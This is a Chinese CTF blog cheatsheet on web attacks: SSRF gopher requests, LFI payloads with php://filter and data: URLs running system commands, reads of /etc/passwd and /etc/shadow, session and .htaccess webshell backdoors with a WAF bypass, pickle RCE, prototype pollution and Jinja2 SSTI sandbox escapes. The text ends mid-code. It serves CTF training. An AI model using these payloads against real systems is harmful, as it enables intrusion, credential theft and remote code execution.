<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>分類: CTF - TriBlog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="TriBlog"><meta name="msapplication-TileImage" content="/img/trianglesnake.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="TriBlog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="TriBlog"><meta property="og:url" content="https://blog.trianglesnake.com/"><meta property="og:site_name" content="TriBlog"><meta property="og:locale" content="zh_TW"><meta property="og:image" content="https://blog.trianglesnake.com/img/og_image.png"><meta property="article:author" content="TriangleSnake"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://blog.trianglesnake.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.trianglesnake.com"},"headline":"TriBlog","image":["https://blog.trianglesnake.com/img/og_image.png"],"author":{"@type":"Person","name":"TriangleSnake"},"publisher":{"@type":"Organization","name":"TriBlog","logo":{"@type":"ImageObject","url":"https://blog.trianglesnake.com/img/triblog.svg"}},"description":""}</script><link rel="icon" href="/img/trianglesnake.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/triblog.svg" alt="TriBlog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/trianglesnake"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜尋" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分類</a></li><li class="is-active"><a href="#" aria-current="page">CTF</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-04-30T07:11:21.000Z" title="2024/4/30 下午3:11:21">2024-04-30</time>發表</span><span class="level-item"><time dateTime="2024-06-30T06:18:23.139Z" title="2024/6/30 下午2:18:23">2024-06-30</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/CTF/Cheatsheet/">Cheatsheet</a></span><span class="level-item">13 分鐘讀完 (大約1912個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/04/30/CTF-Cheatsheet-Web/">CTF Cheatsheet - Web</a></p><div class="content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Information-Leak"><a href="#Information-Leak" class="headerlink" title="Information Leak"></a>Information Leak</h2><h3 id="git-svn-bzr"><a href="#git-svn-bzr" class="headerlink" title=".git &#x2F; .svn &#x2F; .bzr"></a>.git &#x2F; .svn &#x2F; .bzr</h3><p>版本控制系統</p>
<p>.git洩漏可用scrabble將整個.git資料夾下載下來並用git 還原</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scrabble http://www.example.com/ </span><br></pre></td></tr></table></figure>

<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:www.example.com</span><br><span class="line">intext:<span class="string">&quot;管理介面&quot;</span></span><br><span class="line">filetype:sql</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p>
<p>robots.txt</p>
<p>.DS_Store</p>
<p>.index.php.swp</p>
<p>Backup file</p>
<h2 id="PHP-弱型別判斷"><a href="#PHP-弱型別判斷" class="headerlink" title="PHP 弱型別判斷"></a>PHP 弱型別判斷</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/1.png" alt="https://i.stack.imgur.com/giVhE.png"></p>
<p><a target="_blank" rel="noopener" href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/211902/">PHP弱型別的安全問題詳細總結</a></p>
<h3 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5()&amp;sha1()"></a>md5()&amp;sha1()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="keyword">array</span>()) ==<span class="title function_ invoke__">sha1</span>(<span class="keyword">array</span>())<span class="comment">//true=&gt;error=error</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>)==<span class="number">0</span> <span class="comment">//true</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">md5(240610708)=&gt;&#x27;0e462097431906509019562988736854&#x27;</span></span><br><span class="line"><span class="comment">在弱型別判斷中會做為科學記號和int比較</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aa3OFF9m&#x27;</span>)=&gt;<span class="string">&#x27;0e36977786278517984959260394024281014729&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shijiahao/p/12638484.html">https://www.cnblogs.com/shijiahao/p/12638484.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9">https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9</a></p>
<h2 id="header竄改"><a href="#header竄改" class="headerlink" title="header竄改"></a>header竄改</h2><h3 id="可偽造ip相關"><a href="#可偽造ip相關" class="headerlink" title="可偽造ip相關"></a>可偽造ip相關</h3><ul>
<li><code>X-Forward-For</code></li>
<li><code>Client-IP</code></li>
<li><code>X-Real-IP</code></li>
</ul>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="gopher-用法"><a href="#gopher-用法" class="headerlink" title="gopher 用法"></a>gopher 用法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//host:port/_HTTPRequest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//example POST request:</span></span><br><span class="line"></span><br><span class="line">*<span class="attr">gopher</span>:<span class="comment">//192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1</span></span><br><span class="line"><span class="title class_">Host</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1000</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="attr">type</span>:application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>:<span class="number">20</span></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=bupt666</span><br><span class="line"><span class="comment">//換行要用%0D%0A(\r\n)*</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>備註：發起POST的四個必要欄位</em><br>POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1<br>host:192.168.0.109<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>Content-Length:11</p>
</blockquote>
<p>gopher POST request payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https:&#x2F;&#x2F;hackmd.io&#x2F;@Lhaihai&#x2F;H1B8PJ9hX</a></p>
<hr>
<h2 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI&amp;RFI"></a>LFI&amp;RFI</h2><h3 id="php-require-include"><a href="#php-require-include" class="headerlink" title="php require()&amp;include()"></a>php require()&amp;include()</h3><h4 id="偽協議"><a href="#偽協議" class="headerlink" title="偽協議"></a><strong>偽協議</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpfilter</span></span><br><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phar 打包成zip下載</span></span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//data:URL schema</span></span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==**</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/384080/">data:URL schema更多用法</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#敏感檔案</span></span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>

<h3 id="SESSION植入WebShell"><a href="#SESSION植入WebShell" class="headerlink" title="SESSION植入WebShell"></a><strong>SESSION植入WebShell</strong></h3><p>若session可寫入，可以利用LFI執行php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寫入<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt;</span><br></pre></td></tr></table></figure>

<p>session_path可由phpinfo內找到session.save_path，若無則放在&#x2F;tmp內</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</p>
<p>session檔名為sess_&lt;session id&gt;</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">freebuf-LFI</a></p>
<hr>
<h2 id="JS-prototype-pollution"><a href="#JS-prototype-pollution" class="headerlink" title="JS prototype pollution"></a>JS prototype pollution</h2><p><a target="_blank" rel="noopener" href="https://github.com/aszx87410/blog/issues/88">基於 JS 原型鏈的攻擊手法：Prototype Pollution</a></p>
<p>當javascript在呼叫內建函式時，會透過prototype找上一層要呼叫的函式(因為內建函式並沒有真正在乎叫的物件之中)<br>舉例來說:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lst = [<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lst.<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>
<p><code>toString()</code>不可能每個宣告的Array Object都有toString()，當呼叫時必須透過prototype找到上一層然後呼叫<code>Array.toString</code></p>
<p>所以其實在呼叫<code>lst.toString()</code>的時候其實是呼叫了<code>Array.prototype.toString()</code></p>
<p>而哪些<code>object</code>的prototype是甚麼則定義在object的__proto__裡面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lst.<span class="property">__proto__</span>.<span class="property">toString</span> == <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>因此，在一些情況下，有些功能可能造成prototype可以被竄改，進而導致prototype pollution</p>
<h3 id="parse-query"><a href="#parse-query" class="headerlink" title="parse query"></a>parse query</h3><p>在對於Array進行賦值的時候，攻擊者可以透過構造key為<code>__proto__</code>達到prototype pollution</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parseQuery function回傳一個parsed的dict</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseQuery</span>(<span class="params">queryString</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> params = &#123;&#125;;</span><br><span class="line">  queryString.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">param</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [key, value] = param.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    params[key] = value;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example usage</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;user=admin&amp;isAdmin=true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parsing user input</span></span><br><span class="line"><span class="keyword">const</span> parsedQuery = <span class="title function_">parseQuery</span>(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedQuery);  <span class="comment">// Output: &#123; user: &#x27;admin&#x27;, isAdmin: &#x27;true&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 透過prototype pollution把驗證機制竄改掉，繞過檢查機制</span></span><br><span class="line"><span class="title function_">parseQuery</span>(<span class="string">&#x27;user=admin&amp;isAdmin=true&amp;__proto__.isAdmin=true&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// isAdmin被竄改，return true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">isAdmin</span>);  <span class="comment">// Output: true</span></span><br></pre></td></tr></table></figure>
<h3 id="合併物件"><a href="#合併物件" class="headerlink" title="合併物件"></a>合併物件</h3><p>合併物件同樣有可能發生</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> a[prop] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[prop], b[prop])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[prop] = b[prop]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">c</span>: <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> customConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: 1&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(config, customConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">isAdmin</span>)</span><br></pre></td></tr></table></figure>

<p>不難看出，其實只要有對Object的key和value進行操作，就很有可能導致prototype pollution</p>
<hr>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>可影響apache伺服器中資料夾內的檔案</p>
<p><strong>利用指定404、403等錯誤響應文件達成LFI</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /flag.txt</span><br><span class="line">ErrorDocument <span class="number">404</span> /shell.php</span><br></pre></td></tr></table></figure>

<p><strong>強制解析非php檔案造成RCE</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure>

<p><strong>將.htaccess本身作為php執行後門</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>#為.htaccess的註解符號</p>
<p><strong>若有WAF則可用\換行繞過</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?=echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>


<p>遇到\時，會接續下一行</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
<h2 id="Serialize-Deserialize"><a href="#Serialize-Deserialize" class="headerlink" title="Serialize&amp;Deserialize"></a>Serialize&amp;Deserialize</h2><p>呼叫反序列化時，可能呼叫一些Magic Method</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><table>
<thead>
<tr>
<th>Value</th>
<th>Serialize(PHP)</th>
</tr>
</thead>
<tbody><tr>
<td>8459302</td>
<td>i:8459302;</td>
</tr>
<tr>
<td>TRUE</td>
<td>b:1;</td>
</tr>
<tr>
<td>NULL</td>
<td>N;</td>
</tr>
<tr>
<td>[’x’,1]</td>
<td>a:2:{i:0;s:1:”x”;i:1;i:1;}</td>
</tr>
</tbody></table>
<p><strong>PHP Object的序列化</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;kitten&quot;</span>) =&gt;O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;kitten&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;  =&gt;&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$b</span>; =&gt;&#123;s:<span class="number">6</span>:<span class="string">&quot;\x00Cat\x00b&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$c</span>; =&gt;&#123;s:<span class="number">4</span>:<span class="string">&quot;\x00*\x00c&quot;</span>;.....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP Magic Method</span><br><span class="line">在指定時機自動呼叫magic method</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//Object 被銷毀或garbage collection</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//unserialize時觸發</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//被呼叫不存在方法時觸發</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//被當成string處理時觸發(如 echo)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**Python Pickle**</span><br><span class="line">pickle.dumps()會將資料序列化</span><br><span class="line">可寫payloads</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output,([<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;/flag_5fb2acebf1d0c558&#x27;</span>],))</span><br><span class="line">再想辦法把payload()塞進dumps裡面</span><br></pre></td></tr></table></figure>

<h3 id="Phar與反序列化"><a href="#Phar與反序列化" class="headerlink" title="Phar與反序列化"></a>Phar與反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="SSTI-Server-Side-Template-Injection"><a href="#SSTI-Server-Side-Template-Injection" class="headerlink" title="SSTI(Server Side Template Injection)"></a>SSTI(Server Side Template Injection)</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/2.png"></p>
<p>python Flask預設模板為Jinja2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(template)</span><br><span class="line"><span class="comment">#可做一些簡單運算</span></span><br><span class="line">template=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125; =&gt;<span class="number">49</span></span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">for</span> item <span class="keyword">in</span> item_list %&#125;</span><br><span class="line">	&#123;&#123; item &#125;&#125;&#123;% <span class="keyword">if</span> <span class="keyword">not</span> loop.last %&#125;,&#123;% endif %&#125;</span><br><span class="line">&#123;%-endfor-%&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">可以import os os.system()嗎? 不行，code是放在sandbox中跑的</span></span><br><span class="line"><span class="string">但可以用config.from_pyfile(filename)執行任意python檔案</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用_mro_(Method Resolution Order) <strong>bypass Python的Sandbox</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[].__class__ =&gt;&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="comment">#對object 查詢method</span></span><br><span class="line"></span><br><span class="line">[].__class__.__mro__ =&gt;(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;object&gt;)</span></span><br><span class="line"><span class="string">#_mro_可查詢解析物件順序，此時可以發現所有物件的底層皆為object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__ =&gt;&lt;class &#x27;</span><span class="built_in">object</span><span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#_base_可返回最底層的method,所以返回object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class_.__base_.__subclasses__()</span></span><br><span class="line"><span class="string">#_subclasses_直接返回所有subclasses，猛了object在最底層，所以所有物件都會return</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#os出現了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 